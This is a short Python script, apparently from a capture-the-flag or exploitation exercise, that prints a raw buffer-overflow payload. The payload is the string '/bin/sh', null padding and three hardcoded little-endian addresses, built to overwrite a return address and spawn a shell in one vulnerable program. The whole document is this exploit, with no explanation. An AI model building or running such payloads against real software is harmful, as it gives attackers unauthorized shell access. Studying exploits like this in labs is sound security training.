#!/usr/bin/env python3

import sys

sys.stdout.buffer.write(b'/bin/sh' + b'\x00'*19 + 0x7ffffff69ebe.to_bytes(8, 'little') + 0x7ffffff69f00.to_bytes(8, 'little') + 0x455050.to_bytes(8, 'little'))